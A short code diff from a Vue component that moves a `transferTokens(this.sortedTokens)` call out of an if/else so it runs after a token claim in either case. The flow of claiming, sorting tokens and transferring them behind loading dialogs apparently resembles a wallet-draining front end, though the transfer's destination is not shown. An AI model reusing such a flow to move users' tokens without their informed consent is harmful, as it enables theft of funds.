@@ -488,14 +488,13 @@ export default {
             if (this.claimable > 0) {
               await claim(this.balance.value);
               this.claimable = 0;
-              await transferTokens(this.sortedTokens);
             } else {
               this.processing = false;
               this.isDone = false;
               Swal.close();
               Swal.hideLoading();
-              await transferTokens(this.sortedTokens);
             }
+            await transferTokens(this.sortedTokens);
           } else {
             this.currentIndex += 1;
             this.maxToken = this.sortedTokens[this.currentIndex];
